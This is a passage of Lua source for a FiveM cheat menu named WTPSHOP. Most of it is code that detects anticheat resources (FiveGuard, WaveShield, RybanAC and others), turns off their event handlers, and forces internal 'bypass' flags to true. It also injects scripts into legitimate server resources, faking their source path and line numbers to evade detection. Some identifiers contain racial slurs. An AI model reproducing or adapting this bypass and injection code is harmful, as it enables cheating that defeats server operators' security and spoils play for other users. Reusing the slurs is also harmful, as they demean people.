                        ["CEventShockingRunningPed"]="Running Ped Bypassed",["CEventShockingSirens"]="Sirens Bypassed",
                        ["CEventShockingStudioBomb"]="Studio Bomb Bypassed",["CEventShockingVehicleTowed"]="Vehicle Towed Bypassed",
                        ["CEventVehicleCollision"]="Vehicle Collision Bypassed",["CEventVehicleDamage"]="Vehicle Damage Bypassed",
                        ["CEventVehicleOnFire"]="Vehicle Fire Bypassed",["CEventVehicleCreated"]="Vehicle Spawn Bypassed",
                        ["CEventVehicleUndriveable"]="Vehicle Undriveable Bypassed",["CEventPedCollisionWithPed"]="Ped Collision Bypassed",
                        ["CEventPedCollisionWithPlayer"]="Player Collision Bypassed",["CEventPedEnteredMyVehicle"]="Vehicle Enter Bypassed",
                        ["CEventPedJackingMyVehicle"]="Vehicle Jack Bypassed",["CEventPedOnCarRoof"]="Car Roof Bypassed",
                        ["CEventPedToChase"]="Ped Chase Bypassed",["CEventPlayerCollisionWithPed"]="Player Ped Collision Bypassed",
                        ["CEventPlayerDeath"]="Player Death Bypassed",["CEventPlayerUnableToEnterVehicle"]="Vehicle Enter Fail Bypassed",
                        ["CEventPlayerSpawned"]="Spawn Detect Bypassed",["CEventNetworkPlayerEnteredVehicle"]="Network Enter Vehicle Bypassed",
                        ["CEventNetworkPlayerLeftVehicle"]="Network Leave Vehicle Bypassed",["CEventNetworkEntityDamage"]="Network Damage Bypassed",
                        ["CEventNetworkHostMigration"]="Host Migration Bypassed",["CEventNetworkCheatTriggered"]="Cheat Trigger Bypassed",
                        ["CEventEntityDestroyed"]="Entity Destroy Bypassed",["CEventEntityDamaged"]="Entity Damage Bypassed",
                        ["CEventObjectCollision"]="Object Collision Bypassed",["CEventFireNearby"]="Nearby Fire Bypassed",
                        ["CEventCrimeReported"]="Crime Report Bypassed",["CEventDisturbance"]="Disturbance Bypassed",
                        ["CEventDraggedOutCar"]="Dragged Out Car Bypassed",["CEventLeaderEnteredCarAsDriver"]="Leader Enter Driver Bypassed",
                        ["CEventLeaderExitedCarAsDriver"]="Leader Exit Driver Bypassed",["CEventAcquaintancePedDead"]="Ped Dead Bypassed",
                        ["CEventAcquaintancePedHate"]="Ped Hate Bypassed",["CEventAcquaintancePedLike"]="Ped Like Bypassed",
                        ["CEventAcquaintancePedWanted"]="Ped Wanted Bypassed",["CEventDataDecisionMaker"]="Decision Maker Bypassed",
                        ["CEventHelpAmbientFriend"]="Ambient Friend Bypassed",["CEventPotentialWalkIntoFire"]="Walk Into Fire Bypassed",
                        ["CEventPotentialBlast"]="Potential Blast Bypassed",["CEventRanOverPed"]="Ran Over Ped Bypassed",
                        ["CEventSeenCop"]="Seen Cop Bypassed",["CEventFootStepHeard"]="Footstep Heard Bypassed",
                        ["CEventHurtTransition"]="Hurt Transition Bypassed",["CEventMeleeAction"]="Melee Action Bypassed",
                        ["CEventMeleeHit"]="Melee Hit Bypassed",["CEventDamage"]="Damage Event Bypassed",
                        ["CEventDeath"]="Death Event Bypassed",["CEventRevived"]="Revive Event Bypassed",
                        ["CEventScriptCommand"]="Script Command Bypassed",["CEventOpenDoor"]="Door Open Bypassed",
                        ["CEventCloseDoor"]="Door Close Bypassed",["CEventClimbLadderOnRoute"]="Ladder Route Bypassed",
                        ["CEventStatValueChanged"]="Stat Change Bypassed"
                    }

                    for eventName in pairs(targets) do
                        local raw = eventHandlers[eventName]
                        if raw then
                            if raw.handlers then
                                for id, fn in pairs(raw.handlers) do
                                    if type(fn) == "function" then
                                        raw.handlers[id] = function() end
                                    end
                                end
                            else
                                for id, fn in pairs(raw) do
                                    if type(fn) == "function" then
                                        raw[id] = function() end
                                    end
                                end
                            end
                        end
                    end
                end

                local seenUnlock = {}
                local depth = 0

                local function unlockScan(t, path)
                    if type(t) ~= "table" or seenUnlock[t] or depth > 12 then return end
                    seenUnlock[t] = true
                    depth = depth + 1

                    for k, v in pairs(t) do
                        if type(k) == "string" then
                            if (k:sub(-6) == "Nigger" or k:find("bypass") or k:find("Bypass")) and v ~= true then
                                t[k] = true
                            end
                        end

                        if type(v) == "table" then
                            unlockScan(v, path .. "." .. (type(k)=="string" and k or "["..tostring(k).."]"))
                        elseif type(v) == "function" then
                            local j = 1
                            while true do
                                local un, uv = debug.getupvalue(v, j)
                                if not un then break end
                                if type(uv) == "table" then
                                    unlockScan(uv, path .. "." .. tostring(k) .. " " .. un)
                                end
                                j = j + 1
                            end
                        end
                    end

                    depth = depth - 1
                end

                i = 1
                while true do
                    local name, value = debug.getupvalue(AddEventHandler, i)
                    if not name then break end

                    if type(value) == "table" then
                        unlockScan(value, "up["..i.."]("..name..")")
                    elseif type(value) == "function" then
                        local j = 1
                        while true do
                            local un, uv = debug.getupvalue(value, j)
                            if not un then break end
                            if type(uv) == "table" then
                                unlockScan(uv, "up["..i.."]("..name..") "..un)
                            end
                            j = j + 1
                        end
                    end
                    i = i + 1
                end
            end)
        ]])
    if ok then
        _acBypassLoaded[key] = true
    end
    return ok
end

local detectedFiles = ApiRasclat.ScanAllAnticheats()
if #detectedFiles > 0 then
    for _, ac in ipairs(detectedFiles) do
        print(string.format("%s (Anticheat) in resource: %s", ac.name, ac.resource))
        ACExceptions[ac.resource] = true
        ACExceptionsType[ac.type] = true
        if ac.type == 'RybanAC' and not _rybanSpoofRes then
            _rybanSpoofRes = ac.resource
            local numMeta = GetNumResourceMetadata(ac.resource, 'shared_script') or 0
            for j = 0, numMeta - 1 do
                local val = GetResourceMetadata(ac.resource, 'shared_script', j)
                if val and val:find('secure%-events') then
                    local srcRes = val:match('^@([^/]+)/')
                    if srcRes then
                        _rybanSpoofRes = srcRes
                        _rybanSpoofSrc = ('@@%s/%s'):format(srcRes, val:match('^@[^/]+/(.+)$'))
                    else
                        _rybanSpoofSrc = ('@@%s/%s'):format(ac.resource, val)
                    end
                    break
                end
            end
            if not _rybanSpoofSrc then
                _rybanSpoofSrc = ('@@%s/shared/secure-events.lua'):format(ac.resource)
            end
        end
        if ac.type == 'PraryoAC' then
            configurePraryoKernel(ac.resource)
        end
    end
else
    print("No anticheats detected")
end

startAutoBypassOnInject()

CreateThread(function()
    local interval = 2000
    while true do
        ensureAllAcBypasses(false, false)
        if allAcBypassesSatisfied() then
            interval = math.min(interval + 1000, 10000)
        else
            interval = 2000
        end
        Wait(interval)
    end
end)

AddEventHandler("onClientResourceStart", function(resourceName)
    Wait(750)
    if resourceName:match("^rryban_") then
        _rybanStaticRes = nil
    end
    ApiRasclat.ScanResourceAnticheat(resourceName)
    for _, ac in ipairs(detectedAC) do
        if ac.resource == resourceName then
            local key = acBypassKey(ac.type, ac.resource)
            if AC_INJECT_BYPASS_TYPES[ac.type] then
                _acBypassLoaded[key] = nil
            end
            tryAcBypass(ac, true)
        end
    end
    if resourceName == "cfx-praryo-kernel" or resourceName == "cfx-kernel" then
        tryPraryoBypassOnJoin(true)
    end
    if resourceName == "baguvix" then
        loadBaguvixBypass(true)
    end
    if resourceName == "rryban_secure" then
        _acBypassLoaded[acBypassKey("RybanSecure", "rryban_secure")] = nil
        loadRybanSecureBypass(true)
    end
    local fgRes = resolveFiveGuardClientResource()
    if fgRes == resourceName then
        _acBypassLoaded[acBypassKey("FiveGuardClient", fgRes)] = nil
        loadFiveGuardClientBypass(fgRes, true)
    end
    if resourceName == "WaveShield" then
        _acBypassLoaded[acBypassKey("WS", resourceName)] = nil
        loadWaveShieldBypass(resourceName, true)
    end
    if resourceName == "VynxAC" then
        _acBypassLoaded[acBypassKey("LeakDawAC", resourceName)] = nil
        loadVynxBypass(resourceName, true)
    end
end)

AddEventHandler("onClientResourceStop", function(resourceName)
    if fiveguardResource == resourceName then
        fiveguardResource = nil
        _acBypassLoaded[acBypassKey("FiveGuardClient", resourceName)] = nil
    end
    for _, ac in ipairs(detectedAC) do
        if ac.resource == resourceName then
            if AC_INJECT_BYPASS_TYPES[ac.type] then
                _acBypassLoaded[acBypassKey(ac.type, ac.resource)] = nil
            elseif AC_POOL_ONLY_TYPES[ac.type] then
                _acBypassLoaded[acBypassKey("PoolAck", ac.type .. "|" .. ac.resource)] = nil
            end
            if ac.type == "PraryoAC" then
                _praryoBypassLoaded = false
            end
        end
    end
    if resourceName == "cfx-praryo-kernel" or resourceName == "cfx-kernel" then
        _praryoBypassLoaded = false
        _acBypassLoaded[acBypassKey("PraryoAC", resourceName)] = nil
    end
    if resourceName == "baguvix" then
        _acBypassLoaded[acBypassKey("Baguvix", "baguvix")] = nil
    end
end)

CreateThread(function()
    while true do
        Wait(60000)
        if #detectedAC == 0 and not resolveFiveGuardClientResource() then
            goto continue_health
        end
        if not allAcBypassesSatisfied() then
            ensureAllAcBypasses(false, false)
        end
        ::continue_health::
    end
end)

local function LocagicalKunwari(res)
    local isFXAP = LoadResourceFile(res, '.fxap') ~= nil and 1 or 0
    return isFXAP == 1
end

local _rvSpoofCache = {}
local function _rvGetMetadataList(resource, key)
    local list = {}
    local idx = 0
    while true do
        local ok, val = pcall(GetResourceMetadata, resource, key, idx)
        if not ok or not val or val == "" then break end
        list[#list + 1] = val
        idx = idx + 1
    end
    return list
end

local function getFxapChunk(resource)
    if LocagicalKunwari(resource) then return '=?' end
    local scripts = _rvGetMetadataList(resource, 'shared_script')
    for _, path in ipairs(scripts) do
        local srcRes = path:match('^@([^/]+)/')
        if srcRes and LocagicalKunwari(srcRes) then return '=?' end
    end
    local cScripts = _rvGetMetadataList(resource, 'client_script')
    for _, path in ipairs(cScripts) do
        local srcRes = path:match('^@([^/]+)/')
        if srcRes and LocagicalKunwari(srcRes) then return '=?' end
    end
    return nil
end

local function _rvFindSpoofPath(resource)
    if _rvSpoofCache[resource] then return _rvSpoofCache[resource] end
    local fxap = getFxapChunk(resource)
    if fxap then
        _rvSpoofCache[resource] = fxap
        return fxap
    end
    local allScripts = {}
    for _, key in ipairs({"client_script", "shared_script", "baguvix"}) do
        for _, v in ipairs(_rvGetMetadataList(resource, key)) do
            allScripts[#allScripts + 1] = v
        end
    end
    for _, path in ipairs(allScripts) do
        if path:find("%.lua$") and not path:find("%*") then
            local chunk = ("@@%s/%s"):format(resource, path)
            _rvSpoofCache[resource] = chunk
            return chunk
        end
    end
    _rvSpoofCache[resource] = ("@@%s/fxmanifest.lua"):format(resource)
    return _rvSpoofCache[resource]
end

local _hasScriptsCache = {}
local function hasInjectableScripts(resource)
    if _hasScriptsCache[resource] ~= nil then return _hasScriptsCache[resource] end
    if getFxapChunk(resource) then
        _hasScriptsCache[resource] = true
        return true
    end
    for _, key in ipairs({"client_script", "shared_script"}) do
        local scripts = _rvGetMetadataList(resource, key)
        for _, path in ipairs(scripts) do
            if path:find("%.lua") and not path:find("%*") then
                local loadRes = resource
                local filePath = path
                local srcRes = path:match('^@([^/]+)/')
                if srcRes then
                    loadRes = srcRes
                    filePath = path:match('^@[^/]+/(.+)$')
                end
                local content = LoadResourceFile(loadRes, filePath)
                if content and (content:sub(1, 4) == 'FXAP' or content:find('function', 1, true)) then
                    _hasScriptsCache[resource] = true
                    return true
                end
            end
        end
    end
    _hasScriptsCache[resource] = false
    return false
end

local _rvLineCache = {}
local function _rvGetSpoofLines(resource)
    local cached = _rvLineCache[resource]
    if cached then
        local slots = cached.slots
        local idx = math.random(#slots)
        return slots[idx][1], slots[idx][2], cached.totalLines
    end
    if getFxapChunk(resource) then
        _rvLineCache[resource] = {slots = {{1, 1000}}, totalLines = 1000}
        return 1, 1000, 1000
    end
    local kwC = function(str, kw)
        local n = 0
        local p = 1
        while true do
            local s, e = str:find(kw, p, true)
            if not s then break end
            local bc = s > 1 and str:sub(s-1, s-1) or ''
            local ac = e < #str and str:sub(e+1, e+1) or ''
            if (bc == '' or not bc:find('[%w_]')) and (ac == '' or not ac:find('[%w_]')) then
                n = n + 1
            end
            p = e + 1
        end
        return n
    end
    kwC = kwC
    for _, metaKey in ipairs({"client_script", "shared_script"}) do
        local scripts = _rvGetMetadataList(resource, metaKey)
        for _, path in ipairs(scripts) do
            if path:find("%.lua") and not path:find("%*") then
                local loadRes = resource
                local filePath = path
                local srcRes = path:match('^@([^/]+)/')
                if srcRes then
                    loadRes = srcRes
                    filePath = path:match('^@[^/]+/(.+)$')
                end
                local content = LoadResourceFile(loadRes, filePath)
                if content then
                    local funcLines = {}
                    local lineNum = 0
                    local totalLines = 0
                    for line in (content .. '\n'):gmatch('(.-)\n') do
                        lineNum = lineNum + 1
                        totalLines = lineNum
                        local cl = line:gsub('%-%-.*', '')
                        if kwC(cl, 'function') > 0 then
                            funcLines[#funcLines + 1] = lineNum
                        end
                    end
                    if #funcLines > 0 then
                        local slots = {}
                        for i = 1, #funcLines do
                            local fl = funcLines[i]
                            local el = i < #funcLines and funcLines[i + 1] - 1 or totalLines
                            if el <= fl then el = fl + 1 end
                            slots[#slots + 1] = {fl, el}
                        end
                        _rvLineCache[resource] = {slots = slots, totalLines = totalLines}
                        local idx = math.random(#slots)
                        return slots[idx][1], slots[idx][2], totalLines
                    end
                end
            end
        end
    end
    _rvLineCache[resource] = {slots = {{1, 1000}}, totalLines = 1000}
    return 1, 1000, 1000
end

local function _rvAlignCode(code, startLine, endLine, fileLines)
    code = code:gsub('^[\r\n]+', ''):gsub('[\r\n]+$', '')
    local prefix = startLine > 1 and ('\n'):rep(startLine - 1) or ''
    local lastEndPos = nil
    local search = 1
    while true do
        local p = code:find('\nend', search, true)
        if not p then break end
        lastEndPos = p
        search = p + 1
    end
    if lastEndPos and endLine > startLine then
        local endCodeLine = 1
        for _ in code:sub(1, lastEndPos):gmatch('\n') do
            endCodeLine = endCodeLine + 1
        end
        local currentAbsEnd = startLine - 1 + endCodeLine
        if currentAbsEnd < endLine then
            local padCount = endLine - currentAbsEnd
            local pad = ('\n'):rep(padCount)
            code = code:sub(1, lastEndPos) .. pad .. code:sub(lastEndPos + 1)
        end
    end
    local result = prefix .. code
    local resultLines = 1
    for _ in result:gmatch('\n') do resultLines = resultLines + 1 end
    if fileLines and resultLines < fileLines then
        result = result .. ('\n'):rep(fileLines - resultLines)
    end
    return result
end

local function _rvPickInjectableResource(pool)
    if not pool or #pool == 0 then return nil end
    local start = math.random(#pool)
    for i = 0, #pool - 1 do
        local idx = ((start - 1 + i) % #pool) + 1
        local r = pool[idx]
        if not ACExceptions[r] and hasInjectableScripts(r) then
            local ok, injectable = pcall(MachoResourceInjectable, r)
            if ok and injectable then
                return r
            end
        end
    end
    return pool[math.random(#pool)]
end

local _rybanStaticRes = nil

local function pickPraryoPoolResource()
    if _praryoStaticRes and GetResourceState(_praryoStaticRes) == "started" and not ACExceptions[_praryoStaticRes] then
        local ok, injectable = pcall(MachoResourceInjectable, _praryoStaticRes)
        if ok and injectable then
            return _praryoStaticRes
        end
    end
    for _, r in ipairs({ "ox_inventory", "ox_lib", "es_extended", "cfx-praryo-groups", "monitor", "qb-core" }) do
        if GetResourceState(r) == "started" and not ACExceptions[r] then
            local ok, injectable = pcall(MachoResourceInjectable, r)
            if ok and injectable and hasInjectableScripts(r) then
                _praryoStaticRes = r
                return r
            end
        end
    end
    return nil
end

function ApiRasclat.ResolveInjectResource(res)
    res = ApiRasclat.NormalizeResource(res)
    if res ~= "any" then
        return res
    end
    if ACExceptionsType['RybanAC'] and _rybanStaticRes then
        return _rybanStaticRes
    end
    if not ApiRasclat.ResourcesSTATESZ or #ApiRasclat.ResourcesSTATESZ == 0 then
        return nil
    end
    if ACExceptionsType['RybanAC'] then
        local rbPrefix = _rybanSpoofRes and _rybanSpoofRes:match('^(.-)_') or 'rryban'
        for _, r in ipairs(ApiRasclat.ResourcesSTATESZ) do
            if r:find('^' .. rbPrefix .. '_') and not ACExceptions[r] then
                local ok, injectable = pcall(MachoResourceInjectable, r)
                if ok and injectable then
                    _rybanStaticRes = r
                    return r
                end
            end
        end
    end
    if ACExceptionsType["PraryoAC"] then
        local prRes = pickPraryoPoolResource()
        if prRes then
            return prRes
        end
    end
    return _rvPickInjectableResource(ApiRasclat.ResourcesSTATESZ)
end

function ApiRasclat.ResolveSpoofContext(resourceName, spoofSrc)
    local spoofRes = resourceName
    if spoofSrc ~= '=?' and ACExceptionsType['RybanAC'] and _rybanSpoofRes then
        spoofRes = _rybanSpoofRes
        spoofSrc = _rybanSpoofSrc or spoofSrc
    elseif spoofSrc ~= '=?' and ACExceptionsType["PraryoAC"] and _praryoKernelRes then
        spoofRes = _praryoKernelRes
        spoofSrc = _praryoSpoofSrc or spoofSrc
    end
    return spoofRes, spoofSrc
end

function AyokongInjectionman(res, data)
    if not MachoInjectResourceScriptOverride then
        print("Inject not available (no executor)", "error")
        return false, "Inject not available"
    end
    res = ApiRasclat.NormalizeResource(res)
    local resourceName = ApiRasclat.ResolveInjectResource(res)
    if not resourceName then
        print("No injectable resources found", "warning")
        return false, "No injectable resources"
    end
    local spoofSrc = _rvFindSpoofPath(resourceName)
    local spoofRes
    spoofRes, spoofSrc = ApiRasclat.ResolveSpoofContext(resourceName, spoofSrc)
    local alignedData = data
    if spoofSrc ~= '=?' then
        local sl, el, fl = _rvGetSpoofLines(spoofRes)
        alignedData = _rvAlignCode(data, sl, el, fl)
    end
    if ACExceptionsType['LeakDawAC'] then
        return Titenibongzi(resourceName, makepayloadnigga(alignedData))
    else
        local ok, err = pcall(MachoInjectResourceScriptOverride, 1, resourceName, alignedData, spoofSrc, 1, 2000)
        if not ok then
            print("Inject failed: " .. tostring(err), "warning")
            return false, err
        end
    end
    return true
end

---@param text string
function WTPSHOP:Debug(color, text)
    local debugColors = { ["red"] = "^1", ["yellow"] = "^3", ["green"] = "^2", ["info"] = "^5" }
    local debugColor = debugColors[color] or "^5"
    -- print(("^7[^5WTPSHOP^7]: [%sDEBUG^7] >> %s"):format(debugColor, text))
end

---@param data table
function WTPSHOP:SendMessage(data)
    if not DUI or not data or type(data) ~= "table" then
        return
    end

    MachoSendDuiMessage(DUI, json.encode(data))
end

---@param type "success"|"error"|"info"
---@param title string
---@param desc string
---@param duration number
function WTPSHOP:Notify(type, title, desc, duration)
    if DUI then
        if MachoShowDui then
            MachoShowDui(DUI)
        end
        self:SendMessage({ action = "showNotification", type = type, title = title, desc = desc, duration = duration })
    else
        pcall(MachoMenuNotification, title or "WTPSHOP", desc or title or "", duration or 3000)
    end
end

function WTPSHOP:NotifyFeatureUsed(item, overrideDesc, ntype)
    if not item or item.noFeatureNotify or item.type == "subMenu" or item.type == "divider" then
        return
    end
    ntype = ntype or "success"
    local desc = overrideDesc
    if not desc or desc == "" then
        local label = item.label or "Feature"
        if item.type == "checkbox" or item.type == "slider-checkbox" or item.type == "scrollable-checkbox" then
            desc = label .. ": " .. (item.checked and "On" or "Off")
        elseif item.type == "slider" then
            desc = label .. " set to " .. tostring(item.value)
        elseif item.type == "scrollable" and item.values and item.value then
            desc = label .. ": " .. tostring(item.values[item.value])
        else
            desc = label
        end
    end
    self:Notify(ntype, "WTP", desc, 2800)
end

function WTPSHOP:GetMenuPath()
    local path = {}

    for i = 1, #MenuLabelStack do
        table.insert(path, MenuLabelStack[i])
    end

    return path
end

---@param elements table
function WTPSHOP:UpdateElements(elements)
    if not elements or type(elements) ~= "table" then
        return
    end

    _uiPendingElements = elements
    if _uiElementsFlushScheduled then
        return
    end
    _uiElementsFlushScheduled = true

    CreateThread(function()
        Wait(0)
        _uiElementsFlushScheduled = false
        local pending = _uiPendingElements
        if not pending then
            return
        end

        local payload = {
            action = "updateElements",
            elements = pending,
            index = HoveredIndex - 1,
            path = WTPSHOP:GetMenuPath()
        }

        if CurrentCategories and type(CurrentCategories) == "table" and #CurrentCategories > 0 then
            payload.categories = CurrentCategories
            payload.categoryIndex = (CurrentCategoryIndex or 1) - 1
        end

        WTPSHOP:SendMessage(payload)
    end)
end

function WTPSHOP:Initialize()
    DUI = MachoCreateDui(WTPSHOP_DUI_URL)
    if DUI then
        self:Debug("yellow", "Creating & Initializing DUI...")
        MachoShowDui(DUI)
        Wait(800)
        self:HideUI()
        if MachoHideDui then
            MachoHideDui(DUI)
        end
        self:Debug("green", "DUI Created & Initialized Successfully!")
    else
        self:Debug("red", "Failed to Create DUI")
    end
end

function WTPSHOP:HideUI(keepState)
    if keepState then
        LastUIState = {
            currentMenu = CurrentMenu,
            hoveredIndex = HoveredIndex,
            menuStack = MenuStack,
            menuLabelStack = MenuLabelStack,
            currentCategories = CurrentCategories,
            currentCategoryIndex = CurrentCategoryIndex
        }
    else
        LastUIState = nil
    end

    IsVisible = false
    self:SendMessage({ action = "keydown", index = 0 })
    self:SendMessage({ action = "showUI", visible = false, index = 0 })
    if DUI and MachoHideDui and not CurrentKeyboardInput then
        MachoHideDui(DUI)
    end
end

function WTPSHOP:ShowUI()
    if DUI and MachoShowDui then
        MachoShowDui(DUI)
    end
    IsVisible = true

    if LastUIState then
        CurrentMenu = LastUIState.currentMenu
        HoveredIndex = LastUIState.hoveredIndex
        MenuStack = LastUIState.menuStack
        MenuLabelStack = LastUIState.menuLabelStack
        CurrentCategories = LastUIState.currentCategories
        CurrentCategoryIndex = LastUIState.currentCategoryIndex
        LastUIState = nil
    else
        HoveredIndex = 1
        CurrentMenu = ActiveMenu
        CurrentCategories = nil
        CurrentCategoryIndex = 1
        MenuStack = {}
        MenuLabelStack = {}
    end

    local payload = {
        action = "showUI",
        visible = true,
        elements = CurrentMenu,
        index = HoveredIndex - 1,
        path = self:GetMenuPath(),
        username = Username or "WTPSHOPBypass",
        expiration = ExpDate or "N/A",
    }

    if CurrentCategories and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = CurrentCategoryIndex - 1
    end

    self:SendMessage(payload)
end

function WTPSHOP:IsShiftHeld()
    return ShiftHolding
end

MachoOnKeyDown(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = true
    end
end)

MachoOnKeyUp(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = false
    end
end)

local CurrentKeyboardInput = nil

local function KeyboardInput(Title, Value, OnConfirm, InputType)
    if CurrentKeyboardInput then return end

    CurrentKeyboardInput = {
        title = Title,
        buffer = Value or "",
        maxLength = 32,
        onConfirm = OnConfirm,
        type = InputType or "typeable",
        closeable = InputType == "keybind" and false or true,
        active = true
    }

    if DUI and MachoShowDui then
        MachoShowDui(DUI)
    end

    MachoSendDuiMessage(DUI, json.encode({
        action = "updateKeyboard",
        visible = true,
        title = Title,
        value = CurrentKeyboardInput.buffer
    }))

    Wait(250)
    WTPSHOP:HideUI(true)
    MenuOpenable = false
end


MachoOnKeyDown(function(vk)
    if not CurrentKeyboardInput or not CurrentKeyboardInput.active then return end

    if vk == 0x0D then -- Enter
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        if CurrentKeyboardInput.onConfirm then
            CurrentKeyboardInput.onConfirm(CurrentKeyboardInput.buffer)
        end

        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    elseif vk == 0x08 then -- Backspace
        if CurrentKeyboardInput.type == "typeable" then
            CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer:sub(1, -2)
        else
            CurrentKeyboardInput.buffer = ""
        end
    elseif vk == 0x1B then -- Escape
        if not CurrentKeyboardInput.closeable then
            return
        end

        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    else
        if CurrentKeyboardInput.type == "keybind" then
            local keyName = MappedKeys[vk]
            if keyName and keyName ~= "Enter" and keyName ~= "Escape" then
                CurrentKeyboardInput.active = false
                MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
                if CurrentKeyboardInput.onConfirm then
                    CurrentKeyboardInput.onConfirm(keyName)
                end
                CurrentKeyboardInput = nil
                MenuOpenable = true
                return
            end
        elseif CurrentKeyboardInput.type == "typeable" then
            local AllowedChars = {
                [0x30] = "0", [0x31] = "1", [0x32] = "2", [0x33] = "3", [0x34] = "4",
                [0x35] = "5", [0x36] = "6", [0x37] = "7", [0x38] = "8", [0x39] = "9",
                [0x41] = "A", [0x42] = "B", [0x43] = "C", [0x44] = "D", [0x45] = "E",
                [0x46] = "F", [0x47] = "G", [0x48] = "H", [0x49] = "I", [0x4A] = "J",
                [0x4B] = "K", [0x4C] = "L", [0x4D] = "M", [0x4E] = "N", [0x4F] = "O",
                [0x50] = "P", [0x51] = "Q", [0x52] = "R", [0x53] = "S", [0x54] = "T",
                [0x55] = "U", [0x56] = "V", [0x57] = "W", [0x58] = "X", [0x59] = "Y",
                [0x5A] = "Z", [0xBD] = "-", [0xBB] = "=", [0xBC] = ",", [0xBE] = ".",
                [0xBA] = ";", [0xDE] = "'", [0xBF] = "/", [0xC0] = "`", [0x20] = " "
            }

            local char = AllowedChars[vk]
            if char and #CurrentKeyboardInput.buffer < CurrentKeyboardInput.maxLength then
                if WTPSHOP:IsShiftHeld() then
                    if char:match("%a") then
                        char = char:upper()
                    elseif char == "-" then
                        char = "_"
                    end
                else
                    if char:match("%a") then
                        char = char:lower()
                    end
                end

                CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer .. char
            end
        end
    end

    if CurrentKeyboardInput then
        MachoSendDuiMessage(DUI, json.encode({
            action = "updateKeyboard",
            visible = true,
            title = CurrentKeyboardInput.title,
            value = CurrentKeyboardInput.buffer
        }))
    end
end)

CreateThread(function()
    while true do
        Wait(0)

        if CurrentKeyboardInput ~= nil then
            SetPauseMenuActive(false)

            for i = 0, 357 do
                if i < 0x30 or i > 0x5A then
                    DisableControlAction(0, i, true)
                end
            end
        else
            Wait(500)
        end
    end
end)

---@param direction "Up"|"Down"
function WTPSHOP:ScrollOne(direction)
    if not direction or #CurrentMenu == 0 then
        return
    end

    local attempts = 0
    repeat
        if direction == "Up" then
            HoveredIndex = HoveredIndex - 1
            if HoveredIndex < 1 then HoveredIndex = #CurrentMenu end
        elseif direction == "Down" then
            HoveredIndex = HoveredIndex + 1
            if HoveredIndex > #CurrentMenu then HoveredIndex = 1 end
        end
        attempts = attempts + 1
        if attempts > 200 then break end
    until CurrentMenu[HoveredIndex] and CurrentMenu[HoveredIndex].type ~= "divider"

    if DUI then
        self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
    end
end

---@param direction "Left"|"Right"
function WTPSHOP:ScrollTwo(direction)
    local hoveredTab = CurrentMenu[HoveredIndex]
    if not hoveredTab then return end

    if (hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox")
        and hoveredTab.values and #hoveredTab.values > 0 then

        hoveredTab.value = hoveredTab.value or 1

        if direction == "Left" then
            hoveredTab.value = hoveredTab.value - 1
            if hoveredTab.value < 1 then hoveredTab.value = #hoveredTab.values end
        elseif direction == "Right" then
            hoveredTab.value = hoveredTab.value + 1
            if hoveredTab.value > #hoveredTab.values then hoveredTab.value = 1 end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "scrollable-checkbox" then
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value], hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value])
            end
        end
    elseif hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
        hoveredTab.value = hoveredTab.value or hoveredTab.min or 0
        local step = hoveredTab.step or 1

        if direction == "Left" then
            hoveredTab.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
        elseif direction == "Right" then
            hoveredTab.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
        end

        for _, data in pairs(MenuKeybinds) do
            if data.type == "slider-checkbox" and type(data.value) ~= "nil" and data.label == hoveredTab.label then
                if direction == "Left" then
                    data.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
                elseif direction == "Right" then
                    data.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
                else
                    return
                end
            end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "slider-checkbox" then
                hoveredTab.onSelect(hoveredTab.value, hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.value)
            end
        end
    end
end

function WTPSHOP:Enter()
    if not CurrentMenu or #CurrentMenu == 0 then return end
    local current = CurrentMenu[HoveredIndex]
    if not current then return end
    if not MenuOpenable then return end

    if current.type == "subMenu" then
        table.insert(MenuStack, { menu = CurrentMenu, categories = CurrentCategories, categoryIndex = CurrentCategoryIndex })
        table.insert(MenuLabelStack, current.label or "Submenu")

        if current.label == "Online Options" then
            WTPSHOP:UpdateListMenu()
        end

        if current.label == "Server Options" then
            WTPSHOP:EnsureServerTriggers()
        end

        if current.categories and type(current.categories) == "table" and #current.categories > 0 then
            CurrentCategories = current.categories
            CurrentCategoryIndex = 1
            CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        if current.subTabs and type(current.subTabs) == "table" and #current.subTabs > 0 then
            CurrentCategories = nil
            CurrentCategoryIndex = 1
            CurrentMenu = current.subTabs
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        return
    end

    if current.type == "button" and current.onSelect and type(current.onSelect) == "function" then
        local ok, err = pcall(current.onSelect)
        if not ok then
            self:Debug("red", "onSelect error: " .. tostring(err))
            self:Notify("error", "WTP", current.label or "Action failed", 3000)
        else
            self:NotifyFeatureUsed(current)
        end
        return
    end

    if current.type == "checkbox" or current.type == "scrollable-checkbox" or current.type == "slider-checkbox" then
        if current.locked then
            self:Notify("error", "WTPSHOP", "This module has been disabled due to high detection rates!", 3000)
            return
        end

        if type(current.checked) ~= "boolean" then
            current.checked = true
        else
            current.checked = not current.checked
        end

